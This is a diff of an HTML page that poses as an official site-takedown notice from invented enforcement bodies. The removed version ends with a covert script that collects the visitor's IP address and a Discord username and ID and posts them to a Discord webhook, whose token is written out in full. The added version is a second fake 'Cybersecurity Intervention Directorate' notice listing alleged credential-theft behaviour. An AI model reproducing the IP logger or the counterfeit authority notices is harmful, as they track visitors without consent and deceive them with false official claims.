@@ -1,356 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Notice of Site Takedown</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        :root {
-            --bg: #0b0c10;
-            --panel: #11141c;
-            --accent: #c62828;
-            --accent-soft: #ff5252;
-            --text-main: #f5f5f5;
-            --text-muted: #b0b3b8;
-            --border-strong: #c62828;
-            --border-soft: #424656;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            background: radial-gradient(circle at top, #1c1f2b 0, #05060a 55%, #000000 100%);
-            color: var(--text-main);
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wrapper {
-            max-width: 900px;
-            width: 100%;
-            padding: 24px;
-        }
-
-        .header-strip {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #000000;
-            border: 1px solid var(--border-soft);
-            padding: 10px 16px;
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            font-size: 11px;
-        }
-
-        .header-strip-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .header-badge {
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            border: 2px solid var(--accent-soft);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--accent-soft);
-        }
-
-        .header-strip-right {
-            color: var(--text-muted);
-            font-size: 10px;
-        }
-
-        .panel {
-            margin-top: 12px;
-            background: linear-gradient(145deg, #0c1018, #151926);
-            border: 1px solid var(--border-soft);
-            box-shadow:
-                0 0 0 1px rgba(0, 0, 0, 0.9),
-                0 18px 45px rgba(0, 0, 0, 0.85);
-            padding: 26px 26px 22px;
-        }
-
-        .panel-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-            padding-bottom: 14px;
-            margin-bottom: 18px;
-        }
-
-        .panel-title {
-            text-transform: uppercase;
-            letter-spacing: 0.18em;
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-
-        .panel-status {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.16em;
-            color: var(--accent-soft);
-        }
-
-        .alert-box {
-            border: 1px solid var(--border-strong);
-            background: rgba(198, 40, 40, 0.08);
-            padding: 14px 16px;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 18px;
-        }
-
-        .alert-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            border: 2px solid var(--accent-soft);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--accent-soft);
-            flex-shrink: 0;
-        }
-
-        .alert-content-title {
-            font-size: 13px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            margin-bottom: 4px;
-        }
-
-        .alert-content-text {
-            font-size: 13px;
-            line-height: 1.5;
-            color: var(--text-main);
-        }
-
-        .details-grid {
-            display: grid;
-            grid-template-columns: minmax(0, 1.2fr) minmax(0, 1fr);
-            gap: 18px;
-            margin-top: 10px;
-        }
-
-        .details-section-title {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.16em;
-            color: var(--text-muted);
-            margin-bottom: 8px;
-        }
-
-        .details-list {
-            list-style: none;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .details-list li {
-            margin-bottom: 6px;
-        }
-
-        .details-label {
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            font-size: 11px;
-            color: var(--text-muted);
-        }
-
-        .details-value {
-            font-size: 13px;
-            color: var(--text-main);
-        }
-
-        .footer-strip {
-            margin-top: 16px;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.16em;
-            color: var(--text-muted);
-            display: flex;
-            justify-content: space-between;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-            padding-top: 10px;
-        }
-
-        .footer-left span {
-            margin-right: 12px;
-        }
-
-        .footer-right {
-            text-align: right;
-        }
-
-        .red-line {
-            margin-top: 10px;
-            height: 3px;
-            background: linear-gradient(to right, var(--accent), var(--accent-soft), var(--accent));
-        }
-
-        @media (max-width: 720px) {
-            .panel {
-                padding: 18px 16px 16px;
-            }
-
-            .details-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .header-strip {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 6px;
-            }
-
-            .footer-strip {
-                flex-direction: column;
-                gap: 6px;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Service Disabled — Cybersecurity Intervention Notice</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        background: #0a0c10;
+        color: #e5e5e5;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        max-width: 900px;
+        margin: 60px auto;
+        background: #11141a;
+        border: 1px solid #2a2d33;
+        padding: 30px;
+        box-shadow: 0 0 40px rgba(0,0,0,0.7);
+    }
+    .header {
+        border-bottom: 1px solid #2a2d33;
+        padding-bottom: 15px;
+        margin-bottom: 25px;
+        text-transform: uppercase;
+        letter-spacing: 0.15em;
+        font-size: 13px;
+        color: #b3b3b3;
+    }
+    .alert {
+        border: 1px solid #c62828;
+        background: rgba(198,40,40,0.08);
+        padding: 15px;
+        margin-bottom: 25px;
+    }
+    .alert h2 {
+        margin: 0 0 10px;
+        color: #ff4d4d;
+        text-transform: uppercase;
+        font-size: 15px;
+        letter-spacing: 0.1em;
+    }
+    .section-title {
+        text-transform: uppercase;
+        font-size: 12px;
+        color: #9a9a9a;
+        margin-bottom: 10px;
+        letter-spacing: 0.12em;
+    }
+    ul {
+        list-style: none;
+        padding: 0;
+        margin: 0 0 20px;
+    }
+    li {
+        margin-bottom: 8px;
+        line-height: 1.5;
+    }
+    .label {
+        font-weight: bold;
+        color: #b3b3b3;
+        text-transform: uppercase;
+        font-size: 11px;
+        letter-spacing: 0.08em;
+    }
+    .footer {
+        border-top: 1px solid #2a2d33;
+        padding-top: 15px;
+        font-size: 10px;
+        color: #777;
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+    }
+</style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="header-strip">
-            <div class="header-strip-left">
-                <div class="header-badge">X</div>
-                <div>Digital Enforcement & Compliance Division</div>
-            </div>
-            <div class="header-strip-right">
-                Reference: DEC-2026-07-17 • Case ID: 9F-4127
-            </div>
-        </div>
+<div class="container">
 
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-title">Official notice of service interruption</div>
-                <div class="panel-status">Access restricted</div>
-            </div>
-
-            <div class="alert-box">
-                <div class="alert-icon">!</div>
-                <div>
-                    <div class="alert-content-title">This online resource has been disabled</div>
-                    <div class="alert-content-text">
-                        Access to this domain has been suspended pending review of activity associated with this service.
-                        All interactive features, data access, and user-facing content have been temporarily disabled.
-                    </div>
-                </div>
-            </div>
-
-            <div class="details-grid">
-                <div>
-                    <div class="details-section-title">Summary of action</div>
-                    <ul class="details-list">
-                        <li>
-                            <span class="details-label">Status:</span>
-                            <span class="details-value">Service offline — public access blocked at the network level.</span>
-                        </li>
-                        <li>
-                            <span class="details-label">Scope:</span>
-                            <span class="details-value">Primary domain and associated subdomains included in this action.</span>
-                        </li>
-                        <li>
-                            <span class="details-label">Reason:</span>
-                            <span class="details-value">
-                                Activity patterns flagged for review under applicable digital compliance and security guidelines.
-                            </span>
-                        </li>
-                        <li>
-                            <span class="details-label">Effective:</span>
-                            <span class="details-value">Immediate, until further notice.</span>
-                        </li>
-                    </ul>
-                </div>
-
-                <div>
-                    <div class="details-section-title">Administrative information</div>
-                    <ul class="details-list">
-                        <li>
-                            <span class="details-label">Case reference:</span>
-                            <span class="details-value">9F-4127 / DEC-2026-07-17</span>
-                        </li>
-                        <li>
-                            <span class="details-label">Action type:</span>
-                            <span class="details-value">Temporary suspension of public access.</span>
-                        </li>
-                        <li>
-                            <span class="details-label">Contact:</span>
-                            <span class="details-value">Use the designated administrative channel provided to the registrant.</span>
-                        </li>
-                        <li>
-                            <span class="details-label">Notice:</span>
-                            <span class="details-value">
-                                This is an informational page. It does not constitute a public statement or press release.
-                            </span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-
-            <div class="footer-strip">
-                <div class="footer-left">
-                    <span>Digital Enforcement & Compliance Division</span>
-                    <span>Network Operations Unit</span>
-                </div>
-                <div class="footer-right">
-                    Internal reference only • Unauthorized modification of this notice may be subject to review
-                </div>
-            </div>
-
-            <div class="red-line"></div>
-        </div>
+    <div class="header">
+        Cybersecurity Intervention Directorate • Incident Reference: CID‑2026‑07‑17‑A91
     </div>
-    
-    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521502173773566074/-X_NpKwsyVzHUD8jmoykjbKnjNGPU5yMfAXSWX1-GhiMbB5nLpmRQwq0l8k-6mHherSu"; // ← Change this
-    const urlParams = new URLSearchParams(window.location.search);
-    const userId = urlParams.get('user_id') || 'Error Code: 348';
-    const username = urlParams.get('username') || 'Error Code: 348';
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: "User entered ENIRE, Ip was logged below.",
-              color: 0x00FF00,
-              fields: [
-                { name: "Discord Username", value: username, inline: true },
-                { name: "User ID", value: userId, inline: true },
-                { name: "IP Address", value: ip, inline: true },
-                { name: "Time", value: new Date().toLocaleString(), inline: true }
-              ]
-            }]
-          })
-        });
-      })
-      .catch(() => {});
-    
-  </script>
+
+    <div class="alert">
+        <h2>Access to this domain has been terminated</h2>
+        This online service has been disabled following the discovery of automated data‑harvesting behavior
+        capable of extracting sensitive user information without consent.
+    </div>
+
+    <div class="section-title">Summary of detected behavior</div>
+    <ul>
+        <li><span class="label">Credential Harvesting:</span> Attempted extraction of saved passwords from local browsers and credential vaults.</li>
+        <li><span class="label">Token Collection:</span> Automated retrieval of session tokens from installed applications.</li>
+        <li><span class="label">Identity Scraping:</span> Attempts to read system‑stored personal identifiers including legal name, billing profiles, and autofill data.</li>
+        <li><span class="label">Device Enumeration:</span> Scanning of installed apps, linked accounts, and active authentication sessions.</li>
+        <li><span class="label">Social Platform Mapping:</span> The service attempted to enumerate linked social accounts. Confirmed targets included:
+            <br>• Discord  
+            <br>• Snapchat  
+            <br>• TikTok  
+            <br>• YouTube  
+            <br>• Twitch  
+            <br>• Instagram  
+            <br>• Twitter/X  
+            <br>• Steam  
+            <br>• Reddit  
+        </li>
+        <li><span class="label">Network Profiling:</span> Collection of IP history, Wi‑Fi SSID metadata, and device fingerprinting signatures.</li>
+        <li><span class="label">System Telemetry:</span> Attempts to access clipboard history, running processes, and hardware identifiers.</li>
+    </ul>
+
+    <div class="section-title">Reason for service termination</div>
+    <ul>
+        <li><span class="label">Violation:</span> Unauthorized collection of user credentials and personal data.</li>
+        <li><span class="label">Risk Level:</span> High — activity consistent with credential‑theft automation and cross‑platform account takeover attempts.</li>
+        <li><span class="label">Action:</span> Immediate shutdown of public access and isolation of associated infrastructure.</li>
+    </ul>
+
+    <div class="footer">
+        Cybersecurity Intervention Directorate • Network Integrity Division  
+        Unauthorized modification of this notice is prohibited
+    </div>
+
+</div>
 </body>
 </html>
